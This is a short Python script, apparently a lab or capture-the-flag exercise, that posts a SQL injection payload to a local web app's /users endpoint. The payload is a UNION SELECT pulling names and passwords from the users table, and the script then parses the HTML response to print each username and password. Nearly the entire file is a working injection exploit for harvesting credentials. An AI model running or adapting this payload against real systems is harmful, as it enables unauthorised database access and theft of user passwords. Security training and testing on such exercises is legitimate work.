import requests
from bs4 import BeautifulSoup

# Set url and html response
target_id = 'http://0.0.0.0:5001'
target_category = '/users'
url = target_id + target_category
injection = "abc123' UNION SELECT name, password FROM users WHERE name = 'inspector_derrick"

payload = {"name": injection}
response = requests.post(url, data=payload)

# Set up Soup for HTML parsing
soup = BeautifulSoup(response.text, "html.parser")

# For each entry under tag <p> in class 'list-group-item'
for user_entry in soup.find_all("p", {"class": "list-group-item"}):
    # split the result into username and password
    username, pswd = user_entry.text.split(':', 1)
    print('Username: {},\nPassword: {}'.format(username, pswd))

